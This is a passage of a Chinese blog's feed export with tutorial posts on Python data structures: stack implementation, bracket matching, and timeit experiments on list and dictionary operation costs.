class="title">parChecker</span><span class="params">(symbolString)</span>:</span></div><div class="line">    s = Stack()</div><div class="line">    balanced = <span class="keyword">True</span></div><div class="line">    index = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> index &lt; len(symbolString) <span class="keyword">and</span> balanced:</div><div class="line">        symbol = symbolString[index]</div><div class="line">        <span class="keyword">if</span> symbol <span class="keyword">in</span> <span class="string">"([&#123;"</span>:</div><div class="line">            s.push(symbol)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">if</span> s.isEmpty():</div><div class="line">                balanced = <span class="keyword">False</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                top = s.pop()</div><div class="line">                <span class="keyword">if</span> <span class="keyword">not</span> matches(top,symbol):</div><div class="line">                       balanced = <span class="keyword">False</span></div><div class="line">        index = index + <span class="number">1</span></div><div class="line">    <span class="keyword">if</span> balanced <span class="keyword">and</span> s.isEmpty():</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">matches</span><span class="params">(open,close)</span>:</span></div><div class="line">    opens = <span class="string">"([&#123;"</span></div><div class="line">    closers = <span class="string">")]&#125;"</span></div><div class="line">    <span class="keyword">return</span> opens.index(open) == closers.index(close)</div><div class="line"></div><div class="line"></div><div class="line">print(parChecker(<span class="string">'&#123;&#123;([][])&#125;()&#125;'</span>))</div><div class="line">print(parChecker(<span class="string">'[&#123;()]'</span>)</div></pre></td></tr></table></figure><p><em>ActiveCode 1</em></p><p>这两个例子表明，栈是计算机语言结构处理非常重要的数据结构。几乎你能想到的任何嵌套符号必须按照平衡匹配的顺序。栈还有其他重要的用途。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-简单括号匹配&quot;&gt;&lt;a href=&quot;#1-简单括号匹配&quot; class=&quot;headerlink&quot; title=&quot;1.简单括号匹配&quot;&gt;&lt;/a&gt;1.简单括号匹配&lt;/h4&gt;&lt;p&gt;我们现在把注意力转向使用栈解决真正的计算机问题。你会这么写算术表达式
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>基本数据结构之一</title>
    <link href="http://adamzeng.site/2017/10/27/%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E4%B8%80/"/>
    <id>http://adamzeng.site/2017/10/27/基本数据结构之一/</id>
    <published>2017-10-27T09:12:26.000Z</published>
    <updated>2017-10-27T12:27:50.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-基本数据结构"><a href="#1-基本数据结构" class="headerlink" title="1.基本数据结构"></a>1.基本数据结构</h1><h4 id="1-什么是线性数据结构"><a href="#1-什么是线性数据结构" class="headerlink" title="1.什么是线性数据结构"></a>1.什么是线性数据结构<a id="more"></a></h4><p>我们从四个简单但重要的概念开始研究数据结构。栈，队列，deques，列表是一类数据的容器，他们数据项之间顺序由添加或删除的顺序决定。一旦一个数据项被添加，它相对于前后元素一直保持该位置不变。注入此类的数据结构被称为线性数据结构。</p><p>线性数据结构有两端，有时被称为左右，某些情况被称为前后。你也可以称为顶部和底部，名字都不重要。将两个线性数据结构区分开的方法是添加和移除项的方式，特别是添加和移除项的位置。例如一些结构允许从一端添加项，另一些允许从另一端移除项。</p><p>这些变种的形式产生了计算机科学最有用的数据结构。他们出现在各种算法中，并可以用于解决很多重要的问题。</p><h4 id="2-什么是栈？"><a href="#2-什么是栈？" class="headerlink" title="2.什么是栈？"></a>2.什么是栈？</h4><p>栈（有时称为“后进先出栈”）是一个项的有序集合，其中添加一处新项总发生在同一端。这一端通常称为”顶部”。与顶部对应的端称为“底部”。</p><p>栈的底部很重要，因为在栈中靠近底部的项是存储时间最长的。最近添加的项是最先会被移除的。这种排序原则有时被称为LIFO，后进先出。它基于在集合内的时间长度做排序。较新的项靠近顶部，较旧的项靠近底部。</p><p>栈的例子很常见。几乎所有的自主餐厅都有一堆托盘或盘子，你从顶部拿一个，就会有一个新的托盘给下一个客人。想象桌上有一堆书(Figure 1)，只有顶部的那本书封面可见，要看到其他书的封面。只有先移除他们上面的书。Figure 2展示了另一个栈，包含了很多Python对象。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.3.%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88/assets/3.3.%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88.png" alt="image"></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.3.%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88/assets/3.3.%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88.primitive.png" alt="image"></p><p>和栈相关的最有用的想法之一来自对它的观察。假设从一个干净的桌面开始，现在把书一本本叠起来。你在构造一个栈。考虑下移除一本书会发生什么。移除的顺序跟刚刚被放置的顺序相反。栈之所以重要是因为它能反转项的顺序。插入跟删除顺序相反，Figure 3展示了Python数据对象创建和删除的过程，注意观察他们的顺序。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.3.%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88/assets/3.3.%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88.simplereversal.png" alt="image"></p><p><em>Figure 3</em></p><p>想想这种反转属性，你可以想到使用计算机的时候所碰到的例子。例如每个web浏览器都有一个返回按钮。当你浏览网页时，这些网页被放置在一个栈中（实际是网页的网址）。你现在查看的网站在顶部，你第一个查看的网页在底部。如果按‘返回’按钮，将按相反的顺序浏览刚才的页面。</p><h4 id="3-栈的抽象数据类型"><a href="#3-栈的抽象数据类型" class="headerlink" title="3.栈的抽象数据类型"></a>3.栈的抽象数据类型</h4><p>栈的抽象数据类型由以下结构和操作定义。如上所述，栈被构造未项的有序集合，其中项被添加和从末端一处的位置称为“顶部”。栈是有序的LIFO。栈的操作如下。</p><ul><li>Stack()创建一个空的新栈。它不需要参数，并返回一个空栈。</li><li>push(item)将一个新项添加到栈的顶部。它需要item做参数并不返回任何内容。</li><li>pop()从栈中删除顶部项。它不需要参数并返回item。栈被修改。</li><li>peek()从栈返回顶部项，但不会删除它。不需要参数。不修改栈。</li><li>isEmpty()测试站是否为空。不需要参数，并返回布尔值。</li><li>size()返回栈中的item数量。不需要参数，并返回一个参数。</li></ul><p>例如，s是已经创建的空栈，Table 1展示了栈操作序列的结果。栈中，顶部项列在最右边。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.4.%E6%A0%88%E7%9A%84%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/assets/3.4.%E6%A0%88%E7%9A%84%E6%8A%BD%E8%B1%A1%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.table1.png" alt="image"></p><p><em>table 1</em></p><h4 id="4-Python实现栈"><a href="#4-Python实现栈" class="headerlink" title="4.Python实现栈"></a>4.Python实现栈</h4><p>现在我们已经将栈清楚地定义了抽象数据类型，我们将开始Python的栈的实现。回想一下，当我们给抽象数据类型一个屋里实现时，我们将实现称为数据结构。</p><p>正如我们在第1章所描述的，在Python中，与任何面向对象编程的语言一样，抽象数据类型（如栈）的选择的实现是创建一个新类。栈操作实现为类的方法。此外，为了实现作为元素集合的栈，使用由Python提供的原语集合的能力是有意义的。我们将使用列表作为底层实现。</p><p>回想一下，Python中的列表类提供了有序集合机制和一组方法。例如，如果我们有列表[2,5,3,6,7,4],我们只需要确定列表的哪一端将被认为是栈的顶部。一旦确定，可以使用诸如append和pop的列表方法来实现。</p><blockquote><p>以下栈实现（ActiveCode 1）假定列表的结尾将保存栈的顶部元素。随着栈增长（push 操作），新项将被添加到列表的末尾。 pop 也操作列表末尾的元素。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#test</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stack</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.items=[]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items==[]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self,items)</span>:</span></div><div class="line">        self.items.append(items)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items.pop()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">peek</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self.items[len((self.items))<span class="number">-1</span>]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">size</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> len(self.items)</div></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#test2</span></div><div class="line"><span class="keyword">from</span> test <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line">s=Stack()</div><div class="line"></div><div class="line">print(s.isEmpty())</div><div class="line">s.push(<span class="number">4</span>)</div><div class="line">s.push(<span class="string">'dog'</span>)</div><div class="line">print(s.peek())</div><div class="line">s.push(<span class="keyword">True</span>)</div><div class="line">print(s.size())</div><div class="line">print(s.isEmpty())</div><div class="line">s.push(<span class="number">8.4</span>)</div><div class="line">print(s.pop())</div><div class="line">print(s.pop())</div><div class="line">print(s.size())</div></pre></td></tr></table></figure><p>记住我们只定义类的实现，我们需要创建一个栈，然后使用它。ActiveCode 2 展示了我们通过实例化 Stack 类执行 Table 1中的操作。注意，Stack 类的定义是从 test文件导入的。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-基本数据结构&quot;&gt;&lt;a href=&quot;#1-基本数据结构&quot; class=&quot;headerlink&quot; title=&quot;1.基本数据结构&quot;&gt;&lt;/a&gt;1.基本数据结构&lt;/h1&gt;&lt;h4 id=&quot;1-什么是线性数据结构&quot;&gt;&lt;a href=&quot;#1-什么是线性数据结构&quot; class=&quot;headerlink&quot; title=&quot;1.什么是线性数据结构&quot;&gt;&lt;/a&gt;1.什么是线性数据结构
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python数据结构的字典</title>
    <link href="http://adamzeng.site/2017/10/27/Python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E5%AD%97%E5%85%B8/"/>
    <id>http://adamzeng.site/2017/10/27/Python数据结构的字典/</id>
    <published>2017-10-27T09:12:00.000Z</published>
    <updated>2017-10-27T12:28:05.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python的数据结构之字典"><a href="#Python的数据结构之字典" class="headerlink" title="Python的数据结构之字典"></a>Python的数据结构之字典</h1><p>python 中第二个主要的数据结构是字典。你可能记得，字典和列表不同，你可以通过键而不是位置来访问字典中的项目。在本书的后面，你会看到有很多方法来实现字典。字典的 get 和 set 操作都是 O(1)。另一个重要的操作是 contains，检查一个键是否在字典中也是 O(1)。所有字典操作的效率总结在 Table3 中。关于字典性能的一个重要方面是，我们在表中提供的效率是针对平均性能。 在一些罕见的情况下，contains，get item 和 set item 操作可以退化为 O(n)。我们将在后面的章节介绍。<a id="more"></a></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/2.%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/2.7.%E5%AD%97%E5%85%B8/assets/2.7.%E5%AD%97%E5%85%B8.table3.png" alt="image"></p><p><em>table 3</em></p><p>我们会在最后的实验中，将比较列表和字典之间的contains操作的性能。在此过程中，我们将确认列表的contains操作符是O(n),字典的contains操作符是O(n)。我们将在实验中列出一系列数字，然后随机选择数字，并检查数字是否在列表中。如果我们的性能表是正常的，列表越大，确定列表中是否包含任意一个数字应该花费的时间越长。</p><p>Listing 6 实现了这个比较。注意，我们对容器中的数字执行完全相同的操作。区别在于在第 7 行上 x 是一个列表，第9行上的 x 是一个字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> timeit</div><div class="line"><span class="keyword">import</span> random</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>,<span class="number">1000001</span>,<span class="number">20000</span>):</div><div class="line">    t=timeit.Timer(<span class="string">"random.randrange(%d) in x"</span>%i,</div><div class="line">                   <span class="string">"from __main__ import random,x"</span>)</div><div class="line">    x=list(range(i))</div><div class="line">    lst_time=t.timeit(number=<span class="number">1000</span>)</div><div class="line">    x=&#123;j:<span class="keyword">None</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(i)&#125;</div><div class="line">    d_time=t.timeit(number=<span class="number">1000</span>)</div><div class="line">    print(<span class="string">"%d,%10.3f,%10.3f"</span> % (i, lst_time, d_time))</div><div class="line">    </div><div class="line">    <span class="number">10000</span>,     <span class="number">0.084</span>,     <span class="number">0.001</span></div><div class="line"><span class="number">30000</span>,     <span class="number">0.237</span>,     <span class="number">0.001</span></div><div class="line"><span class="number">50000</span>,     <span class="number">0.411</span>,     <span class="number">0.001</span></div><div class="line"><span class="number">70000</span>,     <span class="number">0.555</span>,     <span class="number">0.001</span></div><div class="line"><span class="number">90000</span>,     <span class="number">0.698</span>,     <span class="number">0.001</span></div><div class="line"><span class="number">110000</span>,     <span class="number">0.860</span>,     <span class="number">0.001</span></div><div class="line"><span class="number">130000</span>,     <span class="number">1.018</span>,     <span class="number">0.002</span></div><div class="line"><span class="number">150000</span>,     <span class="number">1.189</span>,     <span class="number">0.001</span></div><div class="line"><span class="number">170000</span>,     <span class="number">1.317</span>,     <span class="number">0.001</span></div><div class="line"><span class="number">190000</span>,     <span class="number">1.561</span>,     <span class="number">0.002</span></div></pre></td></tr></table></figure><p><em>Listing 6</em></p><p>Figure 4 展示了 Listing6 的结果。你可以看到字典一直更快。 对于最小的列表大小为10,000个元素，字典是列表的89.4倍。对于最大的列表大小为990,000 个元素。字典是列表的11,603倍！你还可以看到列表上的contains运算符所花费的时间与列表的大小成线性增长。这验证了列表上的contains运算符是 O(n) 的断言。还可以看出，字典中的 contains 运算符的时间是恒定的，即使字典大小不断增长。事实上，对于字典大小为10,000个元素，contains操作占用0.004毫秒，对于字典大小为990,000个元素，它也占用0.004毫秒。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/2.%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/2.7.%E5%AD%97%E5%85%B8/assets/2.7.%E5%AD%97%E5%85%B8.figure4.png" alt="image"></p><p><em>Figure 4</em></p><p>由于 Python 是一种不断发展的语言，底层总是有变化的。 有关 Python 数据结构性能的最新信息可以在 Python 网站上找到。 在撰写本文时，Python wiki有一个很好的时间复杂性页面，可以在 <a href="https://wiki.python.org/moin/TimeComplexity" target="_blank" rel="external">Time Complexity Wiki</a> 中找到。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Python的数据结构之字典&quot;&gt;&lt;a href=&quot;#Python的数据结构之字典&quot; class=&quot;headerlink&quot; title=&quot;Python的数据结构之字典&quot;&gt;&lt;/a&gt;Python的数据结构之字典&lt;/h1&gt;&lt;p&gt;python 中第二个主要的数据结构是字典。你可能记得，字典和列表不同，你可以通过键而不是位置来访问字典中的项目。在本书的后面，你会看到有很多方法来实现字典。字典的 get 和 set 操作都是 O(1)。另一个重要的操作是 contains，检查一个键是否在字典中也是 O(1)。所有字典操作的效率总结在 Table3 中。关于字典性能的一个重要方面是，我们在表中提供的效率是针对平均性能。 在一些罕见的情况下，contains，get item 和 set item 操作可以退化为 O(n)。我们将在后面的章节介绍。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>python数据结构的性能</title>
    <link href="http://adamzeng.site/2017/10/27/python%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%9A%84%E6%80%A7%E8%83%BD/"/>
    <id>http://adamzeng.site/2017/10/27/python数据结构的性能/</id>
    <published>2017-10-27T09:11:41.000Z</published>
    <updated>2017-10-27T12:28:39.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python数据结构的性能"><a href="#python数据结构的性能" class="headerlink" title="python数据结构的性能"></a>python数据结构的性能</h1><h3 id="1-Python列表与字典操作的大O性能"><a href="#1-Python列表与字典操作的大O性能" class="headerlink" title="1.Python列表与字典操作的大O性能"></a>1.Python列表与字典操作的大O性能</h3><p>然后我们将做一些基于时间的实验来说明每个数据结构的花销和使用这些数据结构的好处。重要的是了解这些数据结构的效率，因为它们是本书实现其他数据结构所用到的基础模块。<a id="more"></a></p><h3 id="2-列表"><a href="#2-列表" class="headerlink" title="2.列表"></a>2.列表</h3><blockquote><p>“python 的设计者在实现列表数据结构的时候有很多选择。每一个这种选择都可能影响列表操作的性能。为了帮助他们做出正确的选择，他们查看了最常使用列表数据结构的方式，并且优化了实现，以便使得最常见的操作非常快。当然，他们还试图使较不常见的操作快速，但是当需要做出折衷时，较不常见的操作的性能通常牺牲以支持更常见的操作。”</p><p>两个常见的操作是索引和分配到索引位置。无论列表有多大，这两个操作都需要相同的时间。当这样的操作和列表的大小无关时，它们是 O（1）。</p><p>“另一个非常常见的编程任务是增加一个列表。有两种方法可以创建更长的列表，可以使用 append 方法或拼接运算符。append 方法是 O（1)。 然而，拼接运算符是 O（k），其中 k 是要拼接的列表的大小。这对你来说很重要，因为它可以帮助你通过选择合适的工具来提高你自己的程序的效率。”</p></blockquote><p>让我们看看四种不同的方式，我们可以生成一个从0开始的n个数字的列表。首先我们将尝试一个for循环并通过创建列表，然后我们将使用append而不是拼接。接下来，我们使用列表生成器创建列表，最后，也是最明显的方式，通过调用列表构造函数包装range函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> timeit</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></div><div class="line">    l=[]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">        l=l+[i]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></div><div class="line">    l=[]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</div><div class="line">        l.append(i)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test3</span><span class="params">()</span>:</span></div><div class="line">    l=[i <span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1000</span>)]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test4</span><span class="params">()</span>:</span></div><div class="line">    l=list(range(<span class="number">1000</span>))</div><div class="line"></div><div class="line">t1 = timeit.Timer(<span class="string">"test1()"</span>, <span class="string">"from __main__ import test1"</span>)</div><div class="line">print(<span class="string">"concat "</span>,t1.timeit(number=<span class="number">1000</span>), <span class="string">"milliseconds"</span>)</div><div class="line">t2 = timeit.Timer(<span class="string">"test2()"</span>,<span class="string">"from __main__ import test2"</span>)</div><div class="line">print(<span class="string">"append"</span>,t2.timeit(number=<span class="number">1000</span>),<span class="string">"milliseconds"</span>)</div><div class="line">t3 = timeit.Timer(<span class="string">"test3()"</span>, <span class="string">"from __main__ import test3"</span>)</div><div class="line">print(<span class="string">"comprehension "</span>,t3.timeit(number=<span class="number">1000</span>), <span class="string">"milliseconds"</span>)</div><div class="line">t4=timeit.Timer(<span class="string">"test4()"</span>,<span class="string">"from __main__ import test4"</span>)</div><div class="line">print(<span class="string">"list range"</span>,t4.timeit(number=<span class="number">1000</span>),<span class="string">"milliseconds"</span>)</div><div class="line"></div><div class="line"></div><div class="line">concat  <span class="number">1.336322332994314</span> milliseconds</div><div class="line">append <span class="number">0.10088041100243572</span> milliseconds</div><div class="line">comprehension  <span class="number">0.048220083001069725</span> milliseconds</div><div class="line">list range <span class="number">0.017883339009131305</span> milliseconds</div></pre></td></tr></table></figure><p>从上面的试验清楚的看出，append操作比拼接快得多。其他两种方法，列表生成器的速度是append的两倍。</p><blockquote><p>“最后一点，你上面看到的时间都是包括实际调用函数的一些开销，但我们可以假设函数调用开销在四种情况下是相同的，所以我们仍然得到的是有意义的比较。因此，拼接字符串操作需要 6.54 毫秒并不准确，而是拼接字符串这个函数需要 6.54 毫秒。你可以测试调用空函数所需要的时间，并从上面的数字中减去它。”</p></blockquote><p>现在我们已经看到了如何具体测试性能，见Table2，你可能想知道pop两个不同的时间。当列表末尾调用pop时，它需要O(1),但是当在列表中第一个元素或者中建任何地方调用pop时，它是O(n)。原因在于Python实现列表的方式，当一个项从列表前面取出，列表中的其他元素靠近起始位置移动一个位置。你会看到索引操作为O(1)。Python的实现者会权衡选择一个好的方案。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/2.%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/2.6.%E5%88%97%E8%A1%A8/assets/2.6.%E5%88%97%E8%A1%A8%20Table2.png" alt="image"></p><p>作为一种演示性能差异的方法，我们用timeit来做一个实验。我们的目标是验证从列表从末尾pop元素和从开始pop元素的性能。同样，我们也想测量不用列表大小对这个时间的影响。我们期望看到的是，从列表末尾处弹出所需时间将保持不变，即使列表不断增长。而从列表开始处弹出元素时间将随列表增长而增加。</p><p>Listing 4展示了两种pop方式的比较。从第一个示例看出，从末尾弹出需要0.0003毫秒。从开始弹出要花费4.82毫秒。对于一个200万的元素列表，相差16000倍。</p><blockquote><p>Listing 4 需要注意的几点，第一， <code>from __main__ import x</code> , 虽然我们没有定义一个函数，我们确实希望能够在我们的测试中使用列表对象 x, 这种方法允许我们只计算单个弹出语句，获得该操作最精确的测量时间。因为 timer 重复了 1000 次，该列表每次循环大小都减 1。但是由于初始列表大小为 200万，我们只减少总体大小的 0.05%。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> timeit</div><div class="line">popzero=timeit.Timer(<span class="string">"x.pop(0)"</span>,<span class="string">"from __main__ import x"</span>)</div><div class="line">popend=timeit.Timer(<span class="string">"x.pop(0)"</span>,<span class="string">"from __main__ import x"</span>)</div><div class="line"></div><div class="line">x=list(range(<span class="number">2000000</span>))</div><div class="line">print(popzero.timeit(number=<span class="number">1000</span>))</div><div class="line">或者</div><div class="line">print(popend.timeit(number=<span class="number">1000</span>))</div></pre></td></tr></table></figure><p><em>listing 4</em></p><p>虽然我们第一个测试显示pop(0)比pop()慢，但它没有证明pop(0)是O(n),pop()是O(1)，要验证它，我们需要看下一系列列表大小的调用效果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> timeit</div><div class="line">popzero=timeit.Timer(<span class="string">"x.pop(0)"</span>,<span class="string">"from __main__ import x"</span>)</div><div class="line">popend=timeit.Timer(<span class="string">"x.pop()"</span>,<span class="string">"from __main__ import x"</span>)</div><div class="line"></div><div class="line">print(<span class="string">"pop(0)"</span>,<span class="string">"pop()"</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>,<span class="number">10000001</span>,<span class="number">1000000</span>):</div><div class="line">    x=list(range(i))</div><div class="line">    pt=popend.timeit(number=<span class="number">1000</span>)</div><div class="line">    x=list(range(i))</div><div class="line">    pz=popzero.timeit(number=<span class="number">1000</span>)</div><div class="line">    print(<span class="string">"%15.5f,%15.5f"</span> %(pz,pt))</div><div class="line">    </div><div class="line">    </div><div class="line">    pop(<span class="number">0</span>) pop()</div><div class="line">        <span class="number">0.51379</span>,        <span class="number">0.00024</span></div><div class="line">        <span class="number">1.29079</span>,        <span class="number">0.00012</span></div><div class="line">        <span class="number">1.58118</span>,        <span class="number">0.00020</span></div><div class="line">        <span class="number">2.21961</span>,        <span class="number">0.00013</span></div><div class="line">        <span class="number">2.95097</span>,        <span class="number">0.00012</span></div><div class="line">        <span class="number">3.48872</span>,        <span class="number">0.00012</span></div><div class="line">        <span class="number">3.98996</span>,        <span class="number">0.00012</span></div><div class="line">        <span class="number">4.80045</span>,        <span class="number">0.00012</span></div><div class="line">        <span class="number">5.23652</span>,        <span class="number">0.00012</span></div><div class="line">        <span class="number">6.04675</span>,        <span class="number">0.00014</span></div></pre></td></tr></table></figure><p><img src="https://facert.gitbooks.io/python-data-structure-cn/2.%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/2.6.%E5%88%97%E8%A1%A8/assets/2.6.%E5%88%97%E8%A1%A8.poptime.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python数据结构的性能&quot;&gt;&lt;a href=&quot;#python数据结构的性能&quot; class=&quot;headerlink&quot; title=&quot;python数据结构的性能&quot;&gt;&lt;/a&gt;python数据结构的性能&lt;/h1&gt;&lt;h3 id=&quot;1-Python列表与字典操作的大O性能&quot;&gt;&lt;a href=&quot;#1-Python列表与字典操作的大O性能&quot; class=&quot;headerlink&quot; title=&quot;1.Python列表与字典操作的大O性能&quot;&gt;&lt;/a&gt;1.Python列表与字典操作的大O性能&lt;/h3&gt;&lt;p&gt;然后我们将做一些基于时间的实验来说明每个数据结构的花销和使用这些数据结构的好处。重要的是了解这些数据结构的效率，因为它们是本书实现其他数据结构所用到的基础模块。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
</feed>
